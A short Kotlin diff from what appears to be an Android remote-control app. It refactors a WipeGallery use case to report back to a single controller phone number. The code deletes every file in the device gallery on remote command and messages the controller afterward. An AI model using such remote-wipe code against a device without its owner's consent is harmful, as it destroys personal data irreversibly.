@@ -14,17 +14,16 @@ class WipeGallery @Inject constructor(
     private val sendMessageToController: SendMessageToController
 ) {
     suspend operator fun invoke(
-        numbers: List<String>,
+        numbers: String,
         email: String
     ){
-        val firstNumber = numbers.firstOrNull()
         if(!permissionManager.hasManageAllFilesPermission()){
             val messageFromControlled = MessageFromControlled(
                 string = "Gallery Wipe Permission Error",
                 type = MessageTypeFromControlled.ERROR
             )
             insertMessage(email,"Gallery Wipe From $email Permission Error", MessageTypeFromControlled.NORMAL)
-            sendMessageToController(firstNumber,messageFromControlled)
+            sendMessageToController(numbers,messageFromControlled)
         }
         else{
             androidGalleryRepository.deleteAllGalleryFiles()
@@ -33,7 +32,7 @@ class WipeGallery @Inject constructor(
                 type = MessageTypeFromControlled.NORMAL
             )
             insertMessage(email,"Gallery Wipe From $email", MessageTypeFromControlled.NORMAL)
-            sendMessageToController(firstNumber,messageFromControlled)
+            sendMessageToController(numbers,messageFromControlled)
         }
     }
 }
